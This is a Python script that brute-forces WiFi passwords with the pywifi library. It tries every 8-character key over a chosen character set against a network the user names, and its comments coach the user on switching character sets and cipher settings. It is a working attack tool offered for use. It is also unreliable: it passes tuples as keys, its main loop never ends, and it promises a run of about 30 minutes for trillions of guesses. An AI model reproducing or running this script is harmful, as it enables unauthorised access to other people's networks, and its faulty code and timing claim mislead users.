# importing all modules
import pywifi
import time
from pywifi import const
import itertools

# initiating PyWifi object
wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]
iface.scan()

# for wifi in iface.scan_results():
#     print(wifi.ssid)

# main function attempting connection
def connect_wifi(name, password):
    # disconnect current wifi if any
    iface.disconnect()
    time.sleep(0.5)

    if iface.status() == const.IFACE_DISCONNECTED:
        # creating new profile
        profile = pywifi.Profile()

        # initiating network credentials
        profile.ssid = name
        profile.key = password
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.auth = const.AUTH_ALG_OPEN
        profile.cipher = const.CIPHER_TYPE_CCMP

        # remove previous network profiles
        iface.remove_all_network_profiles()
        tep = iface.add_network_profile(profile)

        # attempting connection
        iface.connect(tep)
        time.sleep(0.2)

        # take required action
        if iface.status() == const.IFACE_CONNECTED:
            return password
        else:
            return None

''' 
1.    the first variable is the basic key set for wifi passwords
2.    if you do not get password using the first key set try using the second one
3.    if you still do not get the password check the "akm", "auth", and "cipher" of the the network,
      replace the constants and try again
'''

key_set = "abcdefghijklmnopqrstuvwxyz0123456789@"
# key_set = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-`~;:'\"\\/?.>,<[]{}|=ABCDEFGHIJKLMNOPQRSTUVWXYZ"

found = False
i = 1

wifi_name = input("Please type the name of the wifi: ")
print("Please wait.......this may take upto 30 (or more) minutes!!")

start = time.time()

while not found or found < 50:
    pass_iter = itertools.product(key_set, repeat=8)

    for password in pass_iter:
        validation = connect_wifi(wifi_name, password)

        if validation is not None:
            end = time.time()
            print(f"Password for {wifi_name} found in {end - start} seconds: {validation}")
            found = True

    i += 1

if not found:
    print("Password not found using this key set.....try the second one!")

